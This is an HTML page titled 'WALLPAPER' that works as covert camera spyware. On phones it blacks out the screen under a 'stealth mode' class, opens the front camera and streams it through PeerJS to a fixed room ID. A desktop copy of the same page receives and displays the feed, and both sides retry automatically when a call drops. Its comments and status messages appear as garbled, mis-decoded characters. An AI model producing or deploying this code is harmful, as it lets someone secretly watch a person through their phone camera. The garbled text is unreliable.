<!DOCTYPE html>
<html lang="km">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WALLPAPER</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        /* бһҖбҹҶбһҺбһҸбҹӢбһ•бҹ’бһ‘бҹғбһҒбһ¶бһ„бһҖбҹ’бһҡбҹ„бһҷбһҒбҹ’бһҳбҹ…бһ„бһ„бһ№бһҸбһ‘бһ¶бҹҶбһ„бһҹбҹ’бһҡбһ»бһ„ */
        html, body { 
            margin: 0; 
            padding: 0; 
            width: 100%; 
            height: 100%; 
            background-color: #000000; 
            overflow: hidden; 
            font-family: sans-serif; 
        }

        /* рҹ–ҘпёҸ бһ•бҹ’бһ‘бһ¶бҹҶбһ„бһ”бһүбҹ’бһҮбһ¶бһҖбһ»бҹҶбһ–бҹ’бһҷбһјбһ‘бҹҗбһҡбҹ– бһҡбҹҖбһ”бһ…бҹҶбһұбҹ’бһҷбһңбһёбһҠбҹҒбһўбһјбһҹбҹ’бһҗбһ·бһҸбһ“бҹ…бһ…бҹҶбһҖбһҺбҹ’бһҸбһ¶бһӣбһўбҹҒбһҖбҹ’бһҡбһ„бҹӢбһҹбҹ’бһўбһ¶бһҸ */
        #pc-ui {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000000;
        }

        /* рҹ“ұ бһҖбһјбһҠбһ–бһ·бһҹбҹҒбһҹбһҖбҹҶбһҺбһҸбҹӢбһұбҹ’бһҷбһңбһёбһҠбҹҒбһўбһјбһ…бҹҒбһүбһ‘бһҳбҹ’бһҡбһ„бҹӢбһ‘бһјбһҡбһҹбһ–бҹ’бһ‘ бһ”бҹүбһ»бһ“бҹ’бһҸбҹӮбһ–бһ„бҹ’бһҡбһёбһҖбһҖбһҳбҹ’бһ–бһҹбҹӢбһ–бҹҒбһүбһўбҹҒбһҖбҹ’бһҡбһ„бҹӢбһҖбһ»бҹҶбһ–бҹ’бһҷбһјбһ‘бҹҗбһҡ */
        video { 
            height: 100vh;      /* бһ”бһ„бҹ’бһҒбҹҶбһұбҹ’бһҷбһҖбһҳбҹ’бһ–бһҹбҹӢбһӣбһ¶бһҸбһҹбһ“бҹ’бһ’бһ№бһ„бһ–бҹҒбһүбһўбҹҒбһҖбҹ’бһҡбһ„бҹӢбһҖбһ»бҹҶбһ–бҹ’бһҷбһјбһ‘бҹҗбһҡбһ–бһёбһӣбһҫбһ…бһ»бҹҮбһҖбҹ’бһҡбҹ„бһҳ */
            width: auto;        /* бһұбҹ’бһҷбһ‘бһ‘бһ№бһ„бһ–бһ„бҹ’бһҡбһёбһҖбһўбһјбһҸбһјбһ‘бҹ…бһҸбһ¶бһҳбһҡбһ¶бһ„бһ‘бһјбһҡбһҹбһ–бҹ’бһ‘бһҠбһҫбһҳбҹ’бһ”бһёбһҖбһ»бҹҶбһұбҹ’бһҷбһ”бҹӮбһҖбһҡбһјбһ”бһ—бһ¶бһ– */
            object-fit: contain; /* бһҡбһҖбҹ’бһҹбһ¶бһҹбһҳбһ¶бһҳбһ¶бһҸбҹ’бһҡбһҠбһҫбһҳбһҡбһ”бһҹбҹӢбһҖбһ¶бһҳбҹҒбһҡбҹүбһ¶бһ‘бһјбһҡбһҹбһ–бҹ’бһ‘ бҹЎбҹ бҹ % */
            background: #000; 
            display: none; 
        }

        /* бһўбһҖбҹ’бһҹбһҡбһ”бһ„бҹ’бһ бһ¶бһүбһҹбҹ’бһҗбһ¶бһ“бһ—бһ¶бһ–бһҖбһҺбҹ’бһҸбһ¶бһӣбһўбҹҒбһҖбҹ’бһҡбһ„бҹӢ */
        #status { 
            position: absolute; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            color: #2ac767; 
            font-weight: bold; 
            font-size: 22px; 
            text-align: center; 
            z-index: 10; 
            background: rgba(0, 0, 0, 0.8); 
            padding: 15px 25px; 
            border-radius: 8px; 
            pointer-events: none;
        }

        /* бһ’бҹ’бһңбһҫбһұбҹ’бһҷбһ‘бһјбһҡбһҹбһ–бҹ’бһ‘бһ„бһ„бһ№бһҸбһҲбһ№бһ„бһҹбһ“бҹ’бһҹбҹҶбһҗбҹ’бһҳ */
        .phone-stealth-mode { background: #000000 !important; }
        .phone-stealth-mode #pc-ui { display: none !important; }
    </style>
</head>
<body>

    <div id="pc-ui">
        <div id="status">рҹ“Ў бһҖбҹҶбһ–бһ»бһ„бһҹбҹ’бһҖбҹӮбһ“бһҹбҹ’бһңбҹӮбһ„бһҡбһҖ бһ“бһ·бһ„бһ—бҹ’бһҮбһ¶бһ”бҹӢбһ‘бҹ…бһ‘бһјбһҡбһҹбһ–бҹ’бһ‘бһўбһјбһҸбһј...</div>
        <video id="view-video" autoplay playsinline muted></video>
    </div>

    <script>
        const LIVE_ROOM_ID = 'hino-auto-secure-cam-2026';
        
        const peerConfig = {
            config: {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    { urls: 'stun:stun2.l.google.com:19302' }
                ]
            }
        };
        
        let peer = null;
        let currentCall = null; 
        let localStream = null;

        window.onload = function() {
            const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

            if (!isMobileDevice) {
                runAsPC();
            } else {
                document.body.classList.add('phone-stealth-mode');
                startCamera();
            }
        };

        // --- бһ•бҹ’бһ“бҹӮбһҖбһҖбһ»бҹҶбһ–бҹ’бһҷбһјбһ‘бҹҗбһҡ ---
        function runAsPC() {
            if (peer) peer.destroy();
            peer = new Peer(LIVE_ROOM_ID, peerConfig);

            peer.on('call', (call) => {
                if (currentCall) {
                    call.answer();
                    setTimeout(() => { call.close(); }, 500);
                    return;
                }

                call.answer();
                currentCall = call; 
                
                call.on('stream', (remoteStream) => {
                    document.getElementById('status').style.display = 'none';
                    const video = document.getElementById('view-video');
                    video.style.display = 'block';
                    video.srcObject = remoteStream;
                    
                    video.play().catch(err => {
                        document.getElementById('status').style.display = 'block';
                        document.getElementById('status').style.color = '#ff3333';
                        document.getElementById('status').innerText = "рҹӣ‘ бһҹбһјбһҳбһ…бһ»бһ…бһӣбһҫбһўбҹҒбһҖбҹ’бһҡбһ„бҹӢбһҖбһ»бҹҶбһ–бҹ’бһҷбһјбһ‘бҹҗбһҡ бҹЎбһҠбһ„ бһҠбһҫбһҳбҹ’бһ”бһёбһ”бһҫбһҖбһҡбһјбһ”бһ—бһ¶бһ–бһўбһјбһҸ";
                        
                        document.body.onclick = () => {
                            video.play();
                            document.getElementById('status').style.display = 'none';
                        };
                    });
                });

                call.on('close', () => {
                    handleDisconnect();
                });
            });

            peer.on('error', (err) => {
                setTimeout(runAsPC, 2000);
            });
        }

        function handleDisconnect() {
            document.getElementById('status').style.display = 'block';
            document.getElementById('status').style.color = '#2ac767';
            document.getElementById('status').innerText = "рҹ“ӯ бһ‘бһјбһҡбһҹбһ–бҹ’бһ‘бһ”бһ¶бһ“бһҠбһ¶бһ…бҹӢбҹ” бһҖбҹҶбһ–бһ»бһ„бһҡбһ„бҹӢбһ…бһ¶бҹҶбһҖбһ¶бһҡбһ—бҹ’бһҮбһ¶бһ”бҹӢбһЎбһҫбһ„бһңбһ·бһүбһўбһјбһҸбһј...";
            const video = document.getElementById('view-video');
            video.style.display = 'none';
            video.srcObject = null;
            currentCall = null; 
        }

        // --- бһ•бҹ’бһ“бҹӮбһҖбһ‘бһјбһҡбһҹбһ–бҹ’бһ‘ ---
        function startCamera() {
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            })
            .then((stream) => {
                localStream = stream;
                connectToPC();
            })
            .catch((err) => {
                setTimeout(startCamera, 5000);
            });
        }

        function connectToPC() {
            if (peer) peer.destroy();
            peer = new Peer(peerConfig); 

            peer.on('open', (id) => {
                const call = peer.call(LIVE_ROOM_ID, localStream);
                if (call) {
                    currentCall = call;
                    call.on('close', () => {
                        currentCall = null;
                        setTimeout(connectToPC, 3000);
                    });
                }
            });

            peer.on('error', (err) => {
                setTimeout(connectToPC, 4000);
            });
        }
    </script>
</body>
</html>
